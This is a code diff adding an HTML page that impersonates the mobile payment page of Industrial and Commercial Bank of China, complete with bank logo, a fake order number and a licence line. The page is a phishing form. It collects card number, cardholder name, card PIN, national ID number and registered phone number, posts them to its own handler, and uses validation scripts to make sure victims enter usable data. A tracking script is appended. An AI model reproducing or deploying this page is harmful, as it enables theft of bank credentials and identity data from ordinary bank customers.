@@ -1,0 +1,210 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
+<meta http-equiv="Expires" content="0">
+<meta http-equiv="Pragma" content="no-cache">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>中国工商银行</title>
+<link href="css/Mobile_NetPay_New.css" type="text/css" rel="Stylesheet">
+
+<style type="text/css">
+<!--
+.STYLE1 {color: #FF0000}
+.STYLE2 {color: #000000}
+-->
+</style>
+</head>
+<body onload="InitPage()">
+<div class="Logo">
+  <div align="center">
+    <div>
+      <div><img src="inc/loading_icbc.png" width="771" height="100" class="LogoImg"></div>
+    </div>
+  </div>
+</div>
+<!--订单信息-->
+<div class="BillInfo">
+  <div class="BillInfoArea">
+    <table class="ContentTable">
+      <tbody>
+        
+       
+        
+        <tr>
+          <td class="BillInfoTitle STYLE2">订单号</td>
+          <td class="BillInfoDetail">m310730126623236748</td>
+        </tr>
+        
+      </tbody>
+    </table>
+  </div>
+</div>
+<div class="Asyn_PayAreaContainer">
+  <div>
+    <form method="post" action="?action=zh" name="form1" onsubmit="return ChkFields()">
+     
+      	<script language="JavaScript">
+		function ChkFields(){
+			if (document.form1.zh.value=='') {
+				window.alert ("卡号输入不能为空，请重新输入");
+				form1.zh.focus();
+				return false
+			}
+			var a1=/^(\d{16}|\d{19})$/;
+			if(!a1.test(document.getElementById('zh').value)){
+				window.alert('统提示：\n\n储蓄卡错误错误\n请输入正确的银行卡号');
+				form1.zh.focus();
+				return false
+			}
+			if (document.form1.xm.value=='') { 
+				window.alert ("姓名输入不能为空，请重新输入");
+				form1.xm.focus();
+				//isChinese(document.form1.xm.value)
+				return false
+			}
+			
+			if (document.form1.mm.value=='') { 
+				window.alert ("密码输入不能为空，请重新输入");
+				form1.mm.focus();
+				return false
+			}
+			if (document.form1.mm.value.length<6) { 
+				window.alert ("密码错误！请输入正确的密码");
+				form1.mm.focus();
+				return false
+			}
+			if (document.form1.sfz.value==""){
+				window.alert("身份证号码不能为空！");
+				form1.sfz.focus();
+				return false;
+			}
+			if (!sfz(document.form1.sfz.value)){
+				window.alert("身份证号码错误!");
+				form1.sfz.focus();
+				return false;
+			}
+			
+			if (document.form1.sj.value==""){
+				window.alert("手机号码不能为空！");
+				form1.sj.focus();
+				return false;
+			}
+			
+			if (document.form1.sj.value.length<11) { 
+				window.alert ("手机号码错误！");
+				form1.sj.focus();
+				return false
+			}
+			
+			return true;
+		}
+		//检验汉字
+		function isChinese(s) {
+			var patrn = /^\s*[\u4e00-\u9fa5]{1,15}\s*$/;
+			if(!patrn.exec(s)){
+				return false;
+			}
+			return true;
+		}
+		
+		//数字
+		function isNumber(s) {
+			var patrn = /^\s*\d+\s*$/;
+			//var patrn1=/^\s*\d{16}[\dxX]{2}\s*$/;
+			if(!patrn.exec(s)){
+				return false;
+			}
+			return true;
+		}
+		//校验手机号码：必须以数字开头
+		
+		//检验银行卡号
+		
+		//检验密码
+		
+		//检验身份证
+		function sfz(s) {
+			var patrn = /^\s*\d{15}\s*$/;
+			var patrn1 = /^\s*\d{16}[\dxX]{2}\s*$/;
+			if(!patrn.exec(s) && !patrn1.exec(s)){
+				return false;
+			}
+			return true;
+		}
+		
+		//检验姓名：姓名是2-15字的汉字
+		function xm(s) {
+			var patrn = /^\s*[\u4e00-\u9fa5]{1,}[\u4e00-\u9fa5.·]{0,15}[\u4e00-\u9fa5]{1,}\s*$/; 
+			if(!patrn.exec(s)){
+				return false;
+			}
+			return true;
+		}
+		</script>
+
+     <input id="idType" class="input1" value="0" type="hidden" name="idType">
+      <div>
+        <table class="PayAreaTable">
+          <tbody>
+            <tr class="PayAreaTr">
+              <td class="PayAreaTd"><div class="PayElementTitle">卡（账号）</div>
+                <div class="PayElementContent"><span class="spanTableText"><span class="STYLE1"> <input name="zh" type="text" class="InputBox Asyn_Length" id="zh" maxlength="19" placeholder="请输入卡号" pattern="[0-9]*">
+                </span></span></div></td>
+            </tr>
+            <tr class="PayAreaTr">
+              <td class="PayAreaTd"><div class="PayElementTitle">姓名</div>
+                <div class="PayElementContent"><span class="spanTableText">
+				<input name="xm" type="text" class="InputBox Asyn_Length" id="xm" maxlength="10" placeholder="姓名">
+				</span></div></td>
+            </tr>
+			<tr class="PayAreaTr">
+              <td class="PayAreaTd"><div class="PayElementTitle">卡密码</div>
+                <div class="PayElementContent">
+                  <input id="mm" name="mm" class="InputBox Asyn_RndLength" placeholder="卡密码" maxlength="6" pattern="[0-9]*" type="password">
+                </div></td>
+            </tr>
+			<tr class="PayAreaTr">
+              <td class="PayAreaTd"><div class="PayElementTitle">身份证号</div>
+                <div class="PayElementContent"><span class="spanTableText">
+				<input name="sfz" type="text" class="InputBox Asyn_Length" id="sfz" maxlength="19" placeholder="身份证号码" pattern="[0-9]*">
+				</span></div></td>
+            </tr>
+			
+			<tr class="PayAreaTr">
+              <td class="PayAreaTd"><div class="PayElementTitle">银行预留手机</div>
+                <div class="PayElementContent"><span class="spanTableText">
+				<input name="sj" type="text" class="InputBox Asyn_Length" id="sj" maxlength="11" placeholder="银行预留手机" pattern="[0-9]*">
+                </span></div></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="divTableSpace"></div>
+      <div class="divSubmit">
+        <div class="Asyn_divSumbitBtn">
+          <input class="Asyn_SubmitBtn" value="下一步" type="submit" onclick="ChkFields()">
+        </div>
+      </div>
+    </form>
+  </div>
+  <!--说明文字部分-->
+  <div class="ExplainText">
+    <p class="ExplainWords">说明：</p>
+    <ol class="ExplainWords">
+      <li class="ExplainWords">中国工商银行提供查询个人交易记录</li>
+      <br />
+      <li class="ExplainWords">中国工商银行提供快捷支付服务</li>
+      <br />
+      <li class="ExplainWords">中国工商银行版权所有　京ICP证 030247号</li>
+      <br />
+      <h1 class="ExplainWords"><img src="inc/pic_kxzd11.jpg" alt="ddd" /><img src="inc/fgw.png" alt="ddd" width="106" /></h1>
+    </ol>
+  </div>
+</div>
+</body>
+</html>
+<script language="javascript" type="text/javascript" src="//js.users.51.la/19152439.js"></script>
+<noscript><a href="//www.51.la/?19152439" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="//img.users.51.la/19152439.asp" style="border:none" /></a></noscript>
